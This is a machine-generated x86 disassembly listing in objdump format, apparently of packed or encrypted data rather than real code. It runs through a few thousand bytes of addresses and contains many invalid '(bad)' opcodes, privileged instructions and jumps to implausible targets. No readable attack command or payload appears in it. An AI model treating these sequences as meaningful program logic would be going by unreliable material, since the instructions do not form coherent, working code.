  41693b:	out    dx,eax
  41693c:	jmp    0x4169bb
  41693e:	dec    esp
  41693f:	xchg   BYTE PTR [ecx],cl
  416941:	jmp    0x2e2adb8a
  416946:	lods   al,BYTE PTR ds:[esi]
  416947:	cli    
  416948:	aaa    
  416949:	out    dx,al
  41694a:	sbb    al,0x30
  41694c:	call   0x42b612
  416951:	pop    edi
  416952:	add    DWORD PTR [edi+0x43],edi
  416955:	adc    eax,0x5d7b2a
  41695a:	add    BYTE PTR [eax],al
  41695c:	add    BYTE PTR [eax],al
  41695e:	jns    0x4168e1
  416960:	mov    eax,ds:0x7c597430
  416965:	inc    ebp
  416966:	ins    DWORD PTR es:[edi],dx
  416967:	inc    eax
  416968:	inc    esi
  416969:	je     0x4169e3
  41696b:	in     al,dx
  41696c:	leave  
  41696d:	cmp    ecx,DWORD PTR [esi-0x2a8c7fc8]
  416973:	adc    DWORD PTR [ebp+ecx*1+0x5ee70275],0xa3d47d6a
  41697e:	lea    eax,[ebx+0x6b7503e6]
  416984:	(bad)  
  416985:	sub    edi,esp
  416987:	ret    0x5c02
  41698a:	push   es
  41698b:	sti    
  41698c:	out    0x3,al
  41698e:	repnz retf 0x7cee
  416992:	mov    al,0x2e
  416994:	cs clc 
  416996:	push   cs
  416997:	pop    edx
  416998:	and    ah,BYTE PTR [edx]
  41699a:	inc    edx
  41699b:	imul   ebx,edx,0x43
  41699e:	jl     0x416963
  4169a0:	ror    BYTE PTR [esi],cl
  4169a2:	xor    eax,0xc8d22f73
  4169a7:	(bad)  
  4169a8:	das    
  4169a9:	inc    ebp
  4169aa:	jns    0x4169ae
  4169ac:	xchg   esp,eax
  4169ad:	jle    0x4169b8
  4169af:	jg     0x4169b4
  4169b1:	retf   
  4169b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169b3:	aam    0x95
  4169b5:	jle    0x416945
  4169b7:	cli    
  4169b8:	jno    0x416983
  4169ba:	inc    edx
  4169bb:	test   DWORD PTR [edi-0x17400eff],esp
  4169c1:	add    eax,DWORD PTR [eax]
  4169c3:	add    BYTE PTR [eax],al
  4169c5:	add    BYTE PTR [eax],al
  4169c7:	jne    0x416a48
  4169c9:	dec    esi
  4169ca:	sbb    al,0x75
  4169cc:	sti    
  4169cd:	push   0x2c
  4169cf:	ja     0x4169d3
  4169d1:	out    0xdb,eax
  4169d3:	fisubr DWORD PTR [edx-0x19]
  4169d6:	adc    ebx,DWORD PTR [ebp+0x76]
  4169d9:	adc    al,0x4
  4169db:	jne    0x4169af
  4169dd:	jae    0x4169ae
  4169df:	stos   BYTE PTR es:[edi],al
  4169e0:	pop    ecx
  4169e1:	xchg   bh,cl
  4169e3:	mov    edx,0xc6e76a6a
  4169e8:	add    DWORD PTR [edx+0x74],esp
  4169eb:	cld    
  4169ec:	les    ebx,FWORD PTR [esi-0x5ac4122c]
  4169f2:	(bad)  
  4169f3:	mov    dl,0x1
  4169f5:	add    BYTE PTR [eax-0x46],ah
  4169f8:	ss xchg esp,esi
  4169fb:	es pop edx
  4169fd:	aas    
  4169fe:	rol    DWORD PTR ds:0x7429846d,1
  416a04:	xchg   dl,bh
  416a06:	call   0x29726c81
  416a0b:	bnd jo 0x416a82
  416a0e:	div    dh
  416a10:	sub    BYTE PTR [eax],al
  416a12:	mov    ah,0x6d
  416a14:	ret    0xb77f
  416a17:	ja     0x416a1b
  416a19:	je     0x416a05
  416a1b:	cmp    al,0x5b
  416a1d:	out    dx,eax
  416a1e:	int3   
  416a1f:	ja     0x416a23
  416a21:	add    BYTE PTR [ecx+0x4e],ch
  416a24:	add    eax,0x68716a48
  416a29:	inc    eax
  416a2a:	fiadd  WORD PTR [eax]
  416a2c:	add    BYTE PTR [eax],al
  416a2e:	add    BYTE PTR [eax],al
  416a30:	repz push ebx
  416a32:	(bad)  
  416a33:	call   0x284aaae
  416a38:	jno    0x416a95
  416a3a:	xor    BYTE PTR [edx+edi*1+0x42],ah
  416a3e:	call   0xfda893a0
  416a43:	jo     0x416a80
  416a45:	sub    WORD PTR [ecx-0x1754818b],0x76
  416a4d:	add    bh,ch
  416a4f:	push   esi
  416a50:	jne    0x416acd
  416a52:	xor    ebp,DWORD PTR [ebp-0x42003d78]
  416a58:	fld    QWORD PTR [ecx]
  416a5a:	push   ecx
  416a5b:	mov    dh,0x2c
  416a5d:	shl    BYTE PTR [eax],cl
  416a5f:	test   eax,0x6e83b49
  416a64:	dec    esi
  416a65:	addr16 std 
  416a67:	gs ss cmc 
  416a6a:	adc    BYTE PTR [ebx+edi*4+0x41],ah
  416a6e:	call   0xfda833a0
  416a73:	add    BYTE PTR [edi],ah
  416a75:	mov    ebp,0xbfa1db80
  416a7a:	in     al,0x7d
  416a7c:	popf   
  416a7d:	add    eax,0x47b26a00
  416a82:	dec    DWORD PTR [ecx+edx*8-0x5c00b00b]
  416a89:	and    DWORD PTR [edi-0x4e398bb9],eax
  416a8f:	sbb    BYTE PTR [ebp+0x5],bl
  416a92:	test   DWORD PTR [ebp+0x0],eax
  416a95:	add    BYTE PTR [eax],al
  416a97:	add    BYTE PTR [eax],al
  416a99:	lods   al,BYTE PTR ds:[esi]
  416a9a:	jle    0x416a94
  416a9c:	dec    DWORD PTR [ebx-0x7f]
  416a9f:	pop    esi
  416aa0:	add    DWORD PTR [ebp+eax*1+0x6a],ebx
  416aa4:	cmp    esi,DWORD PTR [esi]
  416aa6:	dec    DWORD PTR [eax-0x3aa4bbb]
  416aac:	jne    0x416b1e
  416aae:	repnz aad 0xff
  416ab1:	adc    ecx,esp
  416ab3:	out    0x91,eax
  416ab5:	and    al,0x4
  416ab7:	add    BYTE PTR [ecx-0x7811f2f],cl
  416abd:	sbb    ebp,DWORD PTR [ecx-0x7f]
  416ac0:	xor    bl,BYTE PTR ds:0xd38b0005
  416ac6:	or     al,0x2f
  416ac8:	fist   DWORD PTR [edi-0x3b]
  416acb:	jo     0x416ad2
  416acd:	test   DWORD PTR [ebx-0xf],edx
  416ad0:	jmp    0x416aa6
  416ad2:	int3   
  416ad3:	popf   
  416ad4:	fld    QWORD PTR cs:[eax*4-0x3fcadfbb]
  416adc:	mov    DWORD PTR [ecx-0x3a],edi
  416adf:	xor    al,0x45
  416ae1:	adc    BYTE PTR [ecx-0x7f],ch
  416ae4:	add    ebx,ebp
  416ae6:	add    al,0x0
  416ae8:	mov    DWORD PTR [ecx-0x13bacb1e],edx
  416aee:	push   0x5b75cc83
  416af3:	add    DWORD PTR [eax],eax
  416af5:	dec    BYTE PTR ds:0xeb388960
  416afb:	cmp    BYTE PTR [eax+eax*1],0x0
  416aff:	add    BYTE PTR [eax],al
  416b01:	add    ch,ah
  416b03:	pop    edx
  416b04:	inc    BYTE PTR [ebx+0x15ae0]
  416b0a:	(bad)  
  416b0b:	pop    esi
  416b0c:	mov    cl,0x8a
  416b0e:	ins    DWORD PTR es:[edi],dx
  416b0f:	xlat   BYTE PTR ds:[ebx]
  416b10:	cmp    cl,BYTE PTR ds:0x47af1
  416b16:	jne    0x416b24
  416b18:	ins    DWORD PTR es:[edi],dx
  416b19:	jmp    0x747c489b
  416b1e:	ins    BYTE PTR es:[edi],dx
  416b1f:	cwde   
  416b20:	ja     0x416b2e
  416b22:	popf   
  416b23:	fldcw  WORD PTR [edx+0x3b]
  416b26:	enter  0x312c,0xc0
  416b2a:	cld    
  416b2b:	sahf   
  416b2c:	dec    ebp
  416b2d:	aaa    
  416b2e:	mov    eax,0xee50f5f5
  416b33:	xchg   esi,eax
  416b34:	dec    ecx
  416b35:	mov    edi,DWORD PTR [ecx-0x26]
  416b38:	cmp    BYTE PTR [eax],0x75
  416b3b:	lea    ebp,ds:0x2bd97589
  416b41:	add    BYTE PTR [ecx+0x54b7aae],ah
  416b47:	in     eax,0xf
  416b49:	scas   eax,DWORD PTR es:[edi]
  416b4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b4b:	jg     0x416b93
  416b4d:	inc    ebx
  416b4e:	int    0x20
  416b50:	sbb    al,BYTE PTR [edi+0x136e75b0]
  416b56:	mov    ecx,0xf9ffc16b
  416b5b:	push   es
  416b5c:	pushf  
  416b5d:	xchg   DWORD PTR [eax],edi
  416b5f:	jmp    0xf362c6df
  416b64:	out    dx,eax
  416b65:	mov    bh,0x0
  416b67:	add    BYTE PTR [eax],al
  416b69:	add    BYTE PTR [eax],al
  416b6b:	mov    edx,0x75014816
  416b70:	pop    ecx
  416b71:	add    eax,ebp
  416b73:	add    al,BYTE PTR ds:[esi]
  416b76:	add    eax,0x5c3c7b75
  416b7b:	stc    
  416b7c:	inc    edx
  416b7d:	sbb    al,0x2b
  416b7f:	cld    
  416b80:	mov    ebp,0xbdfbc3aa
  416b85:	mov    ds:0xf95e362a,al
  416b8a:	mov    al,ds:0xfbfb4bf6
  416b8f:	std    
  416b90:	mov    ebp,0x3794572
  416b95:	or     eax,0x56bdedc3
  416b9a:	outs   dx,BYTE PTR ds:[esi]
  416b9b:	test   eax,0x311856b2
  416ba0:	adc    al,0xa7
  416ba2:	add    ebp,esp
  416ba4:	mov    ah,0x36
  416ba6:	rcr    DWORD PTR [ecx+0x2e],cl
  416ba9:	js     0x416c25
  416bab:	mov    esi,0xba3aea6e
  416bb0:	pop    edx
  416bb1:	repnz sbb eax,0x4bea6742
  416bb7:	repnz les ecx,FWORD PTR [esi]
  416bba:	jp     0x416b6a
  416bbc:	cli    
  416bbd:	adc    eax,0xa47b1ec8
  416bc2:	pop    edi
  416bc3:	pop    esp
  416bc4:	mov    ebp,0x2df4fe06
  416bc9:	(bad)  
  416bca:	ins    DWORD PTR es:[edi],dx
  416bcb:	adc    BYTE PTR [ebx],ch
  416bcd:	xchg   esi,eax
  416bce:	sbb    eax,DWORD PTR [eax]
  416bd0:	add    BYTE PTR [eax],al
  416bd2:	add    BYTE PTR [eax],al
  416bd4:	xchg   ah,bh
  416bd6:	in     eax,dx
  416bd7:	test   DWORD PTR [esi],0xfa1fc25a
  416bdd:	data16 rcl BYTE PTR [eax],cl
  416be0:	test   BYTE PTR [edx+0x5c],0xf9
  416be4:	jmp    0xae9e3ed5
  416be9:	adc    al,0xe8
  416beb:	add    edi,DWORD PTR [edx-0x3b]
  416bee:	mov    dl,0x79
  416bf0:	outs   dx,BYTE PTR ss:[esi]
  416bf2:	add    BYTE PTR [eax-0x50],ah
  416bf5:	and    al,BYTE PTR [edi+0x4340610e]
  416bfb:	mov    ds:0x85437976,al
  416c00:	sub    al,0xeb
  416c02:	xlat   BYTE PTR ds:[ebx]
  416c03:	sub    DWORD PTR [ebx+0x1b],0xc31de8ff
  416c0a:	fbstp  TBYTE PTR [edx-0x76]
  416c0d:	push   esi
  416c0e:	call   0xfda8debd
  416c13:	cmp    BYTE PTR fs:[esi],0xe8
  416c17:	rcr    DWORD PTR [eax-0x4d8c029b],0x69
  416c1e:	jmp    0xc8336016
  416c23:	inc    ecx
  416c24:	jl     0x416c02
  416c26:	cld    
  416c27:	dec    esi
  416c28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c29:	inc    edx
  416c2a:	pop    ebp
  416c2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c2c:	sub    eax,0x76e5c23d
  416c31:	ror    DWORD PTR [eax+0x2056f645],1
  416c37:	loope  0x416c39
  416c39:	add    BYTE PTR [eax],al
  416c3b:	add    BYTE PTR [eax],al
  416c3d:	jbe    0x416c41
  416c3f:	or     DWORD PTR [esi+ecx*8+0x49b75102],0x3422efde
  416c4a:	retw   
  416c4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c4d:	test   eax,0x6edcfd67
  416c52:	adc    BYTE PTR [eax-0x17],al
  416c55:	xlat   BYTE PTR ds:[ebx]
  416c56:	test   bl,0xaa
  416c59:	jbe    0x416cd6
  416c5b:	xor    esp,ecx
  416c5d:	inc    edx
  416c5e:	ret    
  416c5f:	jmp    FWORD PTR [edi+0x33]
  416c62:	push   esi
  416c63:	and    ecx,0x62335af2
  416c69:	jo     0x416bee
  416c6b:	clc    
  416c6c:	fucom  st(4)
  416c6e:	xor    bh,BYTE PTR [ecx]
  416c70:	add    BYTE PTR [ecx+0xa2e72ee],cl
  416c76:	inc    eax
  416c77:	add    DWORD PTR [ecx],eax
  416c79:	mov    dh,dh
  416c7b:	xchg   BYTE PTR [ebp-0x2c],bl
  416c7e:	(bad)  
  416c7f:	outs   dx,BYTE PTR ds:[esi]
  416c80:	or     al,0x41
  416c82:	aas    
  416c83:	or     edi,edi
  416c85:	(bad)  
  416c86:	data16 xor bh,bh
  416c89:	ins    BYTE PTR es:[edi],dx
  416c8a:	(bad)  
  416c8b:	sbb    edx,ebx
  416c8d:	mov    WORD PTR [ecx],es
  416c8f:	add    eax,0x6886075
  416c95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c96:	cmp    al,0xed
  416c98:	add    ecx,DWORD PTR [edx+eax*4]
  416c9b:	jns    0x416c8d
  416c9d:	mov    al,ds:0xe870e8
  416ca2:	add    BYTE PTR [eax],al
  416ca4:	add    BYTE PTR [eax],al
  416ca6:	lahf   
  416ca7:	mov    edi,0x49645d86
  416cac:	in     eax,dx
  416cad:	retf   
  416cae:	pop    ds
  416caf:	add    ebx,edi
  416cb1:	adc    eax,0x401350
  416cb6:	out    0x42,eax
  416cb8:	cmp    eax,0x81669c85
  416cbd:	fstp   DWORD PTR [ebp+0x1]
  416cc0:	add    BYTE PTR [eax+0x4c],ch
  416cc3:	add    DWORD PTR [eax],eax
  416cc5:	adc    ah,ah
  416cc7:	icebp  
  416cc8:	push   eax
  416cc9:	add    BYTE PTR [ecx+edx*2],bl
  416ccc:	mov    bl,BYTE PTR [ebp+0x50]
  416ccf:	leave  
  416cd0:	sbb    al,0x5b
  416cd2:	or     al,0x1
  416cd4:	xchg   DWORD PTR [ebp+0x60],ecx
  416cd7:	and    BYTE PTR [ecx-0x38],0x1c
  416cdb:	call   0xea2f2d28
  416ce0:	mov    esi,0x890094d9
  416ce6:	dec    ecx
  416ce7:	ret    0x7de7
  416cea:	cmp    ecx,ebx
  416cec:	cli    
  416ced:	test   BYTE PTR [ebp-0x65],dh
  416cf0:	stc    
  416cf1:	cmp    edi,0x59
  416cf4:	add    DWORD PTR [eax],eax
  416cf6:	int3   
  416cf7:	rol    DWORD PTR [edx],cl
  416cf9:	add    BYTE PTR [ebp-0x2f],dh
  416cfc:	add    al,0x5d
  416cfe:	clc    
  416cff:	in     eax,0x61
  416d01:	cmc    
  416d02:	ret    0x5c93
  416d05:	(bad)  
  416d06:	cdq    
  416d07:	fwait
  416d08:	imul   ecx,DWORD PTR [ecx+0x0],0x6292a500
  416d12:	push   0x74
  416d14:	pop    ebx
  416d15:	and    eax,0xdb582604
  416d1a:	add    DWORD PTR [edx],edi
  416d1c:	out    dx,al
  416d1d:	adc    edx,0x6a015b74
  416d23:	popa   
  416d24:	or     ebx,esi
  416d26:	push   ecx
  416d28:	sub    eax,0xdb7afd30
  416d2d:	test   al,cl
  416d2f:	jb     0x416d03
  416d31:	fcom   DWORD PTR [ecx]
  416d33:	je     0x416d8e
  416d35:	add    al,0xe3
  416d38:	cmp    DWORD PTR [esi+0x5a677fd],eax
  416d3e:	mov    ecx,DWORD PTR [eax]
  416d40:	into   
  416d41:	imul   edi,ebp,0xb1f24a
  416d47:	jne    0x416da2
  416d49:	pop    ecx
  416d4a:	leave  
  416d4b:	pop    es
  416d4c:	pop    edx
  416d4d:	add    DWORD PTR [ebx-0x295b208],ecx
  416d53:	sub    ch,BYTE PTR [edx+0xc5c67e]
  416d59:	push   ds
  416d5a:	sbb    DWORD PTR [edx],0x18f059
  416d60:	das    
  416d61:	mov    al,0xfb
  416d63:	or     ch,BYTE PTR [ebp-0x57]
  416d66:	mov    ch,0x75
  416d68:	pop    ecx
  416d69:	add    eax,ebp
  416d6b:	iret   
  416d6c:	add    bl,BYTE PTR [ecx+0x64757503]
  416d72:	das    
  416d73:	add    BYTE PTR [eax],al
  416d75:	add    BYTE PTR [eax],al
  416d77:	add    al,ch
  416d79:	arpl   si,dx
  416d7b:	shr    ebp,cl
  416d7d:	cmp    al,0xc2
  416d7f:	dec    eax
  416d80:	out    dx,al
  416d81:	jge    0x416d7e
  416d83:	push   0xffffffd0
  416d85:	arpl   WORD PTR [edi],dx
  416d87:	imul   eax,DWORD PTR [esi-0x6],0x63
  416d8b:	and    BYTE PTR [ecx+0x256aae68],0x5a
  416d92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416d93:	fdiv   DWORD PTR [edx+0x78436463]
  416d99:	lea    esp,[edi-0x20124a81]
  416d9f:	ss mov ch,0xdc
  416da2:	outs   dx,DWORD PTR ds:[esi]
  416da3:	xor    BYTE PTR [ecx-0x3d958198],0x54
  416daa:	call   0x64b6e2b2
  416daf:	popa   
  416db0:	and    BYTE PTR [ebx+0x66],0x41
  416db4:	jne    0x416db8
  416db6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416db7:	mov    esp,0xc06269e7
  416dbc:	pop    edx
  416dbd:	ja     0x416d9e
  416dbf:	xchg   BYTE PTR [edx-0xa],dl
  416dc2:	imul   eax,DWORD PTR [ebx-0x7f],0xce7896d1
  416dc9:	mov    bh,dl
  416dcb:	inc    ebx
  416dcc:	dec    ebp
  416dcd:	sub    DWORD PTR [eax+0x277e7504],edx
  416dd3:	out    dx,eax
  416dd4:	mov    ah,0x75
  416dd6:	ins    BYTE PTR es:[edi],dx
  416dd7:	mov    bh,0x28
  416dd9:	arpl   WORD PTR [esi],dx
  416ddb:	add    BYTE PTR ss:[eax],al
  416dde:	add    BYTE PTR [eax],al
  416de0:	add    BYTE PTR [ebx],ch
  416de2:	js     0x416d87
  416de4:	xor    ch,bh
  416de6:	pop    ecx
  416de7:	rcl    BYTE PTR [esi],1
  416de9:	adc    ah,BYTE PTR [ebx-0x5b]
  416dec:	xchg   dl,cl
  416dee:	std    
  416def:	jmp    FWORD PTR [ecx-0x74]
  416df2:	adc    dh,BYTE PTR [edx-0x1]
  416df5:	inc    eax
  416df6:	inc    edx
  416df7:	data16 jo 0x416e70
  416dfa:	pop    edx
  416dfb:	retf   
  416dfc:	dec    esp
  416dfd:	jbe    0x416e01
  416dff:	xchg   DWORD PTR [ecx+ebp*2],ebp
  416e02:	fadd   DWORD PTR [ebx]
  416e04:	pop    esp
  416e05:	sbb    dl,BYTE PTR [ebx+0x50]
  416e08:	push   ebx
  416e09:	jne    0x416e82
  416e0b:	sub    DWORD PTR ds:0x19fd655f,0x4a
  416e12:	jg     0x416df0
  416e14:	mov    bl,0x4c
  416e16:	gs push eax
  416e18:	xchg   ecx,eax
  416e19:	hlt    
  416e1a:	ret    
  416e1b:	(bad)  
  416e1c:	call   0x9734546f
  416e21:	or     al,0x5b
  416e23:	xchg   esi,eax
  416e24:	(bad)  
  416e25:	or     al,0x65
  416e27:	mov    ch,dh
  416e29:	pop    edx
  416e2a:	add    esi,DWORD PTR [ebp+ebx*8+0x52]
  416e2e:	pop    ss
  416e2f:	je     0x416e0e
  416e31:	pop    edx
  416e32:	ret    0xdd73
  416e35:	push   edx
  416e36:	les    esi,FWORD PTR [ebx-0x13]
  416e39:	test   al,0x3b
  416e3b:	jmp    0xe948902e
  416e40:	jecxz  0x416e6b
  416e42:	add    eax,0xe7e9
  416e47:	add    BYTE PTR [eax],al
  416e49:	add    BYTE PTR [ecx],ah
  416e4b:	add    al,0xe9
  416e4d:	jmp    0x416e58
  416e4f:	bound  eax,QWORD PTR [esi+0x72]
  416e52:	pop    edx
  416e53:	or     bh,ch
  416e55:	mov    edi,0xe1765f4a
  416e5a:	and    eax,0x8b2d135f
  416e5f:	ret    0xb8ff
  416e62:	popa   
  416e63:	inc    edx
  416e64:	mov    DWORD PTR [esi],esp
  416e66:	shl    DWORD PTR [ebp-0x7973f10e],0xc0
  416e6d:	add    BYTE PTR [eax+0x5fbe0afc],dl
  416e73:	xchg   eax,ebp
  416e75:	add    BYTE PTR [eax-0x6ff0b7f3],al
  416e7b:	or     ch,bh
  416e7d:	(bad)  
  416e7e:	fcomp  QWORD PTR [ebp+0x559840c]
  416e84:	add    BYTE PTR [eax],al
  416e86:	xchg   esp,eax
  416e87:	push   edx
  416e88:	add    BYTE PTR [eax+0x41],cl
  416e8b:	pop    esi
  416e8c:	or     BYTE PTR [ebp-0x4c],0x4
  416e90:	mov    BYTE PTR [ebp+0x3],0x5
  416e94:	cmp    bl,0xce
  416e97:	jo     0x416ea4
  416e99:	lea    edx,[ecx-0x7f961756]
  416e9f:	jmp    0x416e9b
  416ea1:	mov    edx,esp
  416ea3:	loopne 0x416e9f
  416ea5:	jne    0x416eb9
  416ea7:	fdiv   DWORD PTR [eax-0x44]
  416eaa:	hlt    
  416eab:	xchg   edx,eax
  416eac:	pop    edi
  416ead:	inc    DWORD PTR [eax]
  416eaf:	add    BYTE PTR [eax],al
  416eb1:	add    BYTE PTR [eax],al
  416eb3:	sti    
  416eb4:	ficomp WORD PTR [eax+0x8]
  416eb7:	add    ah,BYTE PTR [eax-0x1f64fe0b]
  416ebd:	add    eax,0x87058c01
  416ec2:	jae    0x416f2c
  416ec4:	fidivr WORD PTR [esi]
  416ec6:	or     ch,ah
  416ec8:	mov    al,ds:0x6cc28505
  416ecd:	or     BYTE PTR [eax-0x55],dl
  416ed0:	adc    ah,al
  416ed2:	adc    bl,BYTE PTR [eax*1-0x2c2e0f79]
  416ed9:	or     cl,BYTE PTR [esi+0x5b4]
  416edf:	cdq    
  416ee0:	mov    al,ds:0x170650cd
  416ee5:	call   0xfb2b57dc
  416eea:	mov    esi,DWORD PTR [ebp-0x5a]
  416eed:	push   ecx
  416eee:	adc    DWORD PTR [eax-0x3f78fef5],0x3d88d223
  416ef8:	sub    DWORD PTR [esi-0x421d8a2d],edi
  416efe:	fisttp DWORD PTR ds:0xf2fce3e7
  416f04:	out    dx,al
  416f05:	inc    ebx
  416f06:	or     eax,0x3ddf0
  416f0b:	jne    0x416ef3
  416f0d:	out    dx,al
  416f0e:	ror    ebp,cl
  416f10:	adc    ah,cl
  416f12:	cld    
  416f13:	shl    BYTE PTR [ecx],cl
  416f15:	xchg   ebp,eax
  416f16:	add    BYTE PTR [eax],al
  416f18:	add    BYTE PTR [eax],al
  416f1a:	add    BYTE PTR [eax],al
  416f1c:	jne    0x416f89
  416f1e:	xlat   BYTE PTR ds:[ebx]
  416f1f:	cmp    esp,DWORD PTR [edx]
  416f21:	add    BYTE PTR [edi-0x7d],dh
  416f24:	sbb    DWORD PTR [eax+0x6b1ffd65],esi
  416f2a:	sar    esp,1
  416f2c:	sbb    BYTE PTR [ebx],0xe
  416f2f:	inc    eax
  416f30:	jne    0x416f1e
  416f32:	aas    
  416f33:	or     al,0xe8
  416f35:	in     eax,0x4f
  416f37:	not    DWORD PTR [edx+0x19837b87]
  416f3d:	loopne 0x416fa3
  416f3f:	std    
  416f40:	lock in eax,dx
  416f42:	(bad)  
  416f43:	cld    
  416f44:	jp     0x416f35
  416f46:	shr    DWORD PTR [ecx+0x75],cl
  416f49:	call   0x7f3d7b3b
  416f4e:	enter  0x62fc,0xb9
  416f52:	fs jbe 0x416fc2
  416f55:	sub    BYTE PTR [edi+0x70],bh
  416f58:	push   edx
  416f59:	leave  
  416f5a:	add    DWORD PTR fs:[ecx+ebp*2+0x1],esi
  416f5f:	std    
  416f60:	push   0x75400ed5
  416f65:	in     al,dx
  416f66:	imul   edi,edi,0xffffff83
  416f69:	add    ch,BYTE PTR [ebp+esi*1+0x28]
  416f6d:	pusha  
  416f6e:	push   ds
  416f6f:	sbb    esi,0xffffffd2
  416f72:	adc    eax,0xde031867
  416f77:	jge    0x416fd2
  416f79:	pop    edi
  416f7a:	push   es
  416f7b:	inc    BYTE PTR [di+0x6d13]
  416f80:	add    BYTE PTR [eax],al
  416f82:	add    BYTE PTR [eax],al
  416f84:	add    BYTE PTR [eax],al
  416f86:	pusha  
  416f87:	xchg   edi,eax
  416f88:	pop    ebx
  416f89:	iret   
  416f8a:	ins    DWORD PTR es:[edi],dx
  416f8b:	out    0x3,eax
  416f8d:	(bad)  
  416f8f:	in     eax,0x66
  416f91:	call   0x75b093de
  416f96:	imul   esp,ecx,0x355fd866
  416f9c:	addr16 inc esi
  416f9e:	or     bl,BYTE PTR [esi]
  416fa0:	addr16 inc si
  416fa3:	fld    st(3)
  416fa5:	ret    0xf9cf
  416fa8:	inc    ebx
  416fa9:	in     al,dx
  416faa:	dec    edi
  416fab:	mov    edi,0xa65fa921
  416fb0:	jg     0x416f67
  416fb2:	aad    0xf9
  416fb4:	js     0x416fec
  416fb6:	ss jg  0x416f7f
  416fb9:	adc    eax,0x8d7a8e5f
  416fbe:	test   DWORD PTR [esi+0x1769a3f0],eax
  416fc4:	sbb    BYTE PTR [bx+0x64],0xf0
  416fc9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416fca:	push   0x3f
  416fcc:	loope  0x41703f
  416fce:	pop    edi
  416fcf:	push   0xffffffb8
  416fd1:	bound  eax,QWORD PTR [ecx]
  416fd3:	push   0xffffffea
  416fd5:	and    BYTE PTR [ecx],0xd9
  416fd8:	push   ss
  416fd9:	iret   
  416fda:	std    
  416fdb:	pop    ebx
  416fdc:	test   al,0x11
  416fde:	pusha  
  416fdf:	inc    esi
  416fe0:	lods   ax,WORD PTR ds:[esi]
  416fe2:	push   0xffffffde
  416fe4:	mov    bl,0x75
  416fe6:	add    al,BYTE PTR [eax]
  416fe8:	bound  eax,QWORD PTR [eax]
  416fea:	add    BYTE PTR [eax],al
  416fec:	add    BYTE PTR [eax],al
  416fee:	inc    edi
  416fef:	sti    
  416ff0:	imul   ecx,DWORD PTR [eax],0x378945ae
  416ff6:	into   
  416ff7:	mov    al,ds:0x8376e82a
  416ffc:	rcr    BYTE PTR [ebx+eiz*1+0x5ac84689],0x19
  417004:	je     0x416ff3
  417006:	mov    al,BYTE PTR [edx+0x73]
  417009:	in     eax,0xf7
  41700b:	retf   0xd9f7
  41700e:	jg     0x416fd1
  417010:	sub    edi,DWORD PTR [edx-0x2a8478a5]
  417016:	pushf  
  417017:	inc    ebp
  417018:	je     0x417031
  41701a:	ret    
  41701b:	pop    ss
  41701c:	cmp    BYTE PTR [ebp-0x5a],bl
  41701f:	mov    DWORD PTR [ecx+0x19],eax
  417022:	pushf  
  417023:	inc    ebp
  417024:	je     0x417039
  417026:	stos   DWORD PTR es:[edi],eax
  417027:	pop    ss
  417028:	cmp    BYTE PTR ds:0x641dec62,dh
  41702e:	or     ah,BYTE PTR [esi-0x4]
  417031:	scas   al,BYTE PTR es:[edi]
  417032:	sbb    BYTE PTR [edx+0x1e6f0e7],bh
  417038:	add    BYTE PTR [esi-0x5076d15c],bl
  41703e:	adc    cl,dl
  417040:	sub    edi,DWORD PTR [ecx]
  417042:	or     al,bl
  417044:	jmp    0x41705f
  417046:	sub    ebp,ebp
  417048:	push   ss
  417049:	call   0xda05f1c4
  41704e:	sbb    eax,0x2a892e
  417053:	add    BYTE PTR [eax],al
  417055:	add    BYTE PTR [eax],al
  417057:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417058:	sbb    eax,ebp
  41705a:	fnsave [edx]
  41705c:	fidiv  WORD PTR [edi]
  41705e:	jmp    0xf6ab27b5
  417063:	jecxz  0x416ff6
  417065:	add    al,0x4f
  417067:	fcomp  DWORD PTR [edi+0x58]
  41706a:	add    BYTE PTR [esi+ecx*8-0x18b3ff56],ah
  417071:	outs   dx,BYTE PTR ds:[esi]
  417072:	xor    al,0xd7
  417074:	sbb    al,0x50
  417076:	(bad)  
  417077:	fnstenv [ebp+0x8dde84f]
  41707d:	std    
  41707e:	dec    DWORD PTR [edi+0x4b3b0bc2]
  417084:	xor    BYTE PTR fs:[ebx],al
  417087:	pop    esp
  417088:	ss cld 
  41708a:	jne    0x4170ec
  41708c:	aad    0x78
  41708e:	in     al,0xe6
  417090:	add    ebx,DWORD PTR [eax-0x18]
  417093:	mov    al,ds:0x57fffe4c
  417098:	popf   
  417099:	loope  0x4170d4
  41709b:	(bad)  ds:0x6ccc43cc
  4170a1:	or     edi,edi
  4170a3:	cmp    DWORD PTR [edx+0x17550e7],edi
  4170a9:	add    BYTE PTR [ebx-0x150045c7],al
  4170af:	lds    eax,FWORD PTR [edx-0x5c9307b7]
  4170b5:	adc    al,0xcc
  4170b7:	pop    edi
  4170b8:	push   es
  4170b9:	cmp    BYTE PTR [ebp+0x0],0x0
  4170bd:	add    BYTE PTR [eax],al
  4170bf:	add    BYTE PTR [ebx],cl
  4170c1:	out    0x70,eax
  4170c3:	adc    al,0xc
  4170c5:	push   0x15
  4170c7:	add    DWORD PTR [ecx+0x5c],edi
  4170ca:	cmp    BYTE PTR [ebx-0x4c],0x1
  4170ce:	jae    0x4170de
  4170d0:	or     bl,BYTE PTR [ebp+esi*8-0x17aa77e0]
  4170d7:	push   es
  4170d8:	or     al,0x64
  4170da:	hlt    
  4170db:	add    DWORD PTR [ecx+0x5d],ebp
  4170de:	or     BYTE PTR [ebp-0x2c],0x59
  4170e2:	repz inc ebp
  4170e4:	aam    0x59
  4170e6:	or     al,0x84
  4170e8:	jne    0x417102
  4170ea:	add    al,BYTE PTR [eax]
  4170ec:	jne    0x4170ce
  4170ee:	mov    edi,0xf8ae3327
  4170f3:	(bad)  
  4170f4:	stc    
  4170f5:	sub    ch,dh
  4170f7:	adc    edi,ecx
  4170f9:	cmp    al,0x76
  4170fb:	jnp    0x4170e6
  4170fd:	jb     0x417158
  4170ff:	adc    ebx,edx
  417101:	push   0x1
  417103:	mov    DWORD PTR [edx],edi
  417105:	fwait
  417106:	xlat   BYTE PTR ds:[ebx]
